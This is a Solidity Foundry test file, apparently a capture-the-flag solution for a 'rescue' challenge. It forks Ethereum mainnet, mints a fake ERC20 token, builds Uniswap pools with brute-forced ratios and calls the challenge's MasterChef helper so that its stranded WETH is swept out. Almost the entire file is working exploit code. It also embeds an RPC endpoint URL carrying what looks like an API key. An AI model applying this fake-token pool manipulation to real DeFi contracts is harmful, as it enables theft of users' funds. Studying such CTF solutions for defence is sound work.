// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/console2.sol";
import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Setup, WETH9, MasterChefHelper, MasterChefLike, UniswapV2RouterLike, ERC20Like} from "../src/rescue/Setup.sol";

contract FakeERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function setBalance(address destination, uint256 amount) external {
        _burn(destination, balanceOf(destination));
        _mint(destination, amount);
        emit Transfer(address(0), destination, amount);
    }

    function uncheckedTransfer(address destination, uint256 amount) external {
        _mint(destination, amount);
        emit Transfer(address(0), destination, amount);
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

contract ExploitRandom is Test {
    using stdStorage for StdStorage;

    StdStorage _stdstore;

    Setup s;
    IUniswapV2Factory factory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);

    MasterChefHelper mcHelper;
    MasterChefLike masterchef;
    UniswapV2RouterLike router;

    WETH9 WETH;
    ERC20Like DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    FakeERC20 FKE;
    IUniswapV2Pair daiWethLpTkn;
    IUniswapV2Pair wethFkeLpTkn;
    IUniswapV2Pair daiFkeLpTkn;

    uint256 poolIdDaiWeth = 2;

    function setUp() public {
        vm.label(address(this), "User");
        uint256 forkId = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/kwjMP-X-Vajdk1ItCfU-56Uaq1wwhamK");

        vm.selectFork(forkId);
        vm.rollFork(15471120);

        s = new Setup{value: 10 ether}();
        vm.label(address(s), "setup");

        WETH = s.weth();
        mcHelper = s.mcHelper();
        masterchef = mcHelper.masterchef();
        router = mcHelper.router();

        (address _daiWethLpTkn,,,) = masterchef.poolInfo(poolIdDaiWeth);
        daiWethLpTkn = IUniswapV2Pair(_daiWethLpTkn);

        vm.label(address(factory), "factory");
        vm.label(address(DAI), "DAI");
        vm.label(address(WETH), "WETH");
        vm.label(address(mcHelper), "mcHelper");
        vm.label(address(masterchef), "masterchef");
        vm.label(address(router), "router");
        vm.label(address(daiWethLpTkn), "DAI_WETH_LP");

        FKE = new FakeERC20("Fake Token", "FKE");
        vm.label(address(FKE), "FKE");

        wethFkeLpTkn = IUniswapV2Pair(factory.createPair(address(WETH), address(FKE)));
        vm.label(address(wethFkeLpTkn), "WETH_FKE_LP");

        daiFkeLpTkn = IUniswapV2Pair(factory.createPair(address(DAI), address(FKE)));
        vm.label(address(daiFkeLpTkn), "DAI_FKE_LP");

        FKE.approve(address(router), type(uint256).max);
        FKE.approve(address(mcHelper), type(uint256).max);
        DAI.approve(address(router), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
    }

    function writeTokenBalance(address who, address token, uint256 amt) internal {
        _stdstore.target(token).sig(IERC20(token).balanceOf.selector).with_key(who).checked_write(amt);
    }

    function test__exploit() public {
        // Reserves in dai/weth pool
        (uint256 daiReservesDaiWeth, uint256 wethReservesDaiWeth,) = daiWethLpTkn.getReserves();

        // arbitrary weth/fke liquidity
        uint256 wethToLpInWethFkePool = 20e18;
        uint256 fkeToLpInWethFkePool = 20e18;

        // round number of weth which will be added as liquidity with the weth
        // already on the mcHelper contract, so total added liquidity on the weth
        // side will be 11eth
        uint256 wethOutOfWethFkePool = 1e18;

        // Mint FKE and WETH
        FKE.mint(address(this), fkeToLpInWethFkePool);
        WETH.deposit{value: wethToLpInWethFkePool}();

        // Add FKE and WETH as liquidity
        router.addLiquidity(
            address(WETH),
            address(FKE),
            wethToLpInWethFkePool,
            fkeToLpInWethFkePool,
            0,
            0,
            address(this),
            block.timestamp
        );

        address[] memory path = new address[](2);
        path[0] = address(FKE);
        path[1] = address(WETH);
        // Calculate the amount of FKE to be swapped to get 1 WETH back
        uint256 fkeIntoWethFkePool = router.getAmountsIn(wethOutOfWethFkePool, path)[0];

        // Amount of DAI needed to add liquidity in the correct ratio so that
        // all 11 WETH will be added
        uint256 daiOutOfDaiFkePool = ((10e18 + wethOutOfWethFkePool) * daiReservesDaiWeth) / wethReservesDaiWeth;

        // Arbitrary amount of DAI to add to pool, must be a multiple of the
        // daiOutOfDaiFkePool
        uint256 daiToLpInDaiFkePool = daiOutOfDaiFkePool * 10;
        // Brute forced ratio so that fkeIntoDaiFkePool = fkeIntoWethFkePool
        uint256 fkeToLpInDaiFkePool = daiToLpInDaiFkePool * 100000000000000 / 1799163140847036493;

        // Mint FKE and DAI
        FKE.mint(address(this), fkeToLpInDaiFkePool);
        writeTokenBalance(address(this), address(DAI), daiToLpInDaiFkePool);

        // Add DAI and FKE liquidity
        router.addLiquidity(
            address(DAI), address(FKE), daiToLpInDaiFkePool, fkeToLpInDaiFkePool, 0, 0, address(this), block.timestamp
        );

        // Validate fkeIntoDaiFkePool = fkeIntoWethFkePool, becomes our amountIn
        path[1] = address(DAI);
        uint256 fkeIntoDaiFkePool = router.getAmountsIn(daiOutOfDaiFkePool, path)[0];
        assertEq(fkeIntoDaiFkePool, fkeIntoWethFkePool, "amounts should be the same");

        uint256 amountIn = fkeToLpInWethFkePool * 2; // amountIn * 2
        FKE.mint(address(this), amountIn);
        mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), amountIn, 0);

        assertTrue(s.isSolved());
    }

    function logUniswapPair(IUniswapV2Pair pair) public view {
        ERC20 t0 = ERC20(pair.token0());
        ERC20 t1 = ERC20(pair.token1());
        string memory s0 = t0.symbol();
        string memory s1 = t1.symbol();

        (uint256 r0, uint256 r1,) = pair.getReserves();
        uint256 p0 = router.quote(1e18, r1, r0);
        uint256 p1 = router.quote(1e18, r0, r1);
        uint256 k = pair.kLast();

        console2.log("## %s/%s LP Reserves ##", s0, s1);
        console2.log("K        :: %s", k);
        console2.log("Token0   :: %s", s0);
        console2.log("Reserves :: %s", r0);
        console2.log("Price    :: %s", p0);
        console2.log("Token1   :: %s", s1);
        console2.log("Reserves :: %s", r1);
        console2.log("Price    :: %s", p1);
        console2.log();
    }
}
